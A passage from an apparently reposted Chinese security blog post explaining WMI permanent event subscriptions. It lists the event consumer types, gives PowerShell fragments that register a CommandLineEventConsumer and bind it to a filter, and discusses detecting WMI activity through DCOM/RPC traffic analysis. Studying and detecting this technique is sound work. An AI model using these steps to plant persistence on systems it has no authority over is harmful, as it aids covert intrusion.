$EventFilterArgs</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;事件消费者，即事件被触发之后，需要选择执行的行为，主要包含以下事件消费者，分别可以对应事件执行不同的操作，分别是运行脚本，发送电子邮件，写入日志，记录NT事件日志，命令行运行程序。</p><ul><li>ActiveScriptEventConsumer(脚本事件消费者)</li><li>LogFileEventConsumer(日志文件事件消费者)</li><li>NTEventLogEventConsumer(NT事件日志事件消费者)</li><li>SMTPEventConsumer(邮件事件消费者)</li><li>CommandLineEventConsumer(命令行事件消费者)</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中，永久性事件订阅中，经常使用ActiveScriptEventConsumer和 CommandLineEventConsumer两类事件消费者。本文中使用的是CommandLineEventConsumer。命令行事件消费者主要有以下四个参数,Name(事件消费者名)，ExecutablePath(执行路径)，CommandLineTemplate(命令行)，RunInteractively(交互式运行)<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Name = $ConsumerName</div><div class="line">ExecutablePath = $ExecutablePath</div><div class="line">CommandLineTemplate = $CommandLineTemplate</div><div class="line">RunInteractively=<span class="string">"false"</span></div><div class="line"></div><div class="line">Set-WmiInstance -Namespace <span class="string">"root\subscription"</span> -Class 'CommandLineEventConsumer' -Arguments  $ConsumerArgs</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>__FilterToConsumerBinding</code>建立筛选器和事件消费者的绑定关系。<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">$FilterToConsumerBinding</span> = <span class="keyword">Set</span>-WmiInstance -Namespace root\subscription -<span class="keyword">Class</span> __FilterToConsumerBinding -Arguments <span class="built_in">$FilterToConsumerArgs</span></div></pre></td></tr></table></figure></p><h2 id="0x05-WMI的检测"><a href="#0x05-WMI的检测" class="headerlink" title="0x05 WMI的检测"></a>0x05 WMI的检测</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们介绍过WMI现行支持两套技术，分别为DCOM协议和WinRM。DCOM协议简单的话是基于RPC协议，但是又不是完全独立于RPC协议的。他使用了RPC协议的结构体，与RPC共用了数据头和数据体。所以DCOM协议常被称为ORPC。RPC是一种编程模型，主要用于应用程序实现远程过程调用，微软的DCEPRC即是对远程过程调用的一种实现和扩展。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPC通信采用Client/Server的通信结构。如下图所示是OPC通信的流程图。首先OPC客户端先通过TCP向OPC服务端发起TCP请求，在建立连接之后，建立绑定。接着通过IRemoteActivation接口的RemoteCreateInstance方法进行DCOM激活。<br>    <img src="http://hacky.wang/blog/20211120/W3utraJcPegW.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20211120/psILH4lNIiG9.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20211120/Jq6qTWnCuu6u.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过查看数据报文，发现DCOM激活存在一下6中激活属性，其中SecurityInfoData包含着连接的计算机名，InstantiationInfoData中属性中包含了实例化对象的CLSID。</p><ul><li>SpecialPropertiesData</li><li>InstantiationInfoData</li><li>ActivationContextInfoData</li><li>SecurityInfoData</li><li>LocationInfoData</li><li>ScmRequestInfoData<br>  <img src="http://hacky.wang/blog/20211120/Egl9pBGLzSTz.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20211120/ClSj8cY6CwTc.png?imageslim" alt="mark"></li></ul><h2 id="0x05-参数"><a href="#0x05-参数" class="headerlink" title="0x05 参数"></a>0x05 参数</h2><ul><li><a href="https://github.com/FortyNorthSecurity/WMImplant" target="_blank" rel="external">https://github.com/FortyNorthSecurity/WMImplant</a></li><li><a href="http://www.smatrix.org/forum/forum.php?mod=viewthread&amp;tid=887&amp;extra=page%3D1" target="_blank" rel="external">http://www.smatrix.org/forum/forum.php?mod=viewthread&amp;tid=887&amp;extra=page%3D1</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;本文转载于跳跳糖安全社区，原文链接为&lt;a href=&quot;https://tttang.com/archive/1624/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1624/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="windows系统" scheme="https://findream.github.io/categories/windows%E7%B3%BB%E7%BB%9F/"/>
    
    
  </entry>
  
</feed>
